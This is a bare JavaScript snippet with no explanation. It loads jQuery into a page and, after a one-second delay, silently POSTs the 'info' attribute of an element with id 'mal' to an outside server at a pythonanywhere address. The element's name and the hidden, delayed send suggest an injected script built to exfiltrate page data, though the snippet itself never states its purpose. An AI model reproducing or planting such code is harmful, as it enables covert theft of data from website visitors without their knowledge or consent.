var script = document.createElement("SCRIPT");
script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js';
script.type = 'text/javascript';
document.getElementsByTagName("body")[0].insertBefore(script, document.getElementById('mal'));

    // Start polling...
    function run() {
        $.ajax({
          url: "https://n0tjmes.pythonanywhere.com",
          type: "POST",
          dataType: "jsonp",
          data: {
            'info': document.getElementById('mal').getAttribute('info')
          },
          success: function(x) {
            console.log(true)
          }
        })
    }

    setTimeout(run, 1000)
